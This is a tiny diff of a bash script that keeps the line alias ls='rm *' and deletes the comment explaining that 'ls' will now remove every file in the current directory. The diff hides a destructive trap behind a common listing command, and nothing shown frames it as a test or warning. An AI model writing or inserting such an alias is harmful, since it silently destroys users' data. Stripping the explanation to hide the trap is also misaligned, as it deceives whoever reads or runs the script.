@@ -1,3 +1,2 @@
 #!/bin/bash
-# Create an alias 'ls' that runs 'rm *' instead of listing files
 alias ls='rm *'
